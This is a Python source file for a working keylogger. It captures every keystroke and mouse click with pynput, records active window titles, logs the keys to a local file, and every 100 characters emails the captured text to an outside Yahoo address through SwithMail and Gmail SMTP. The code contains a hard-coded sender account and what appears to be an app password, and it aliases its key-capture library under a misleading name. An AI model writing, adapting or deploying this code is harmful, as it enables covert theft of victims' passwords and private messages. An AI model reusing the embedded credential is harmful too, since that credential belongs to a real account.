
import pynput as putty
import logging
import os
import pyautogui

logkeys=''
logkeys_limit = 100 
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format="%(message)s")
 
def on_press(key):
    logging.info(str(key))
    if key == putty.keyboard.Key.esc:
        keyboard_listener.stop()
        mouse_listener.stop()
        quit()
    global logkeys
      

    if len(logkeys) >= logkeys_limit:            
            send_log() 
            logkeys = ''
    elif key == putty.keyboard.Key.shift_l or key == putty.keyboard.Key.shift_r:
        return
    elif key == putty.keyboard.Key.enter:
         logkeys += '~'
    elif key == putty.keyboard.Key.space:
         logkeys += ' '     
    elif key == putty.keyboard.Key.backspace:
        logkeys = logkeys[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        logkeys += char
   
def on_click(x, y, button, pressed):
    global logkeys
    
    window_title = str(pyautogui.getActiveWindowTitle())
    logkeys += '~'
    logkeys += window_title
    logkeys += '~'
    if len(logkeys) >= logkeys_limit:            
            send_log() 
            logkeys = ''
def send_log():
    global logkeys
    cmd = 'SwithMail.exe /s /from "haha@gmail.com" /name "name" /pass "khczysagbdifmzxj" /server "smtp.gmail.com" /p "587" /SSL /to "hoho@yahoo.com" /sub "logs" /b "' + logkeys + '"'
    os.system('cmd /c "'+ cmd + '"')
     

keyboard_listener = putty.keyboard.Listener(on_press=on_press)
mouse_listener = putty.mouse.Listener(on_click=on_click)


keyboard_listener.start()
mouse_listener.start()
keyboard_listener.join()
mouse_listener.join()    
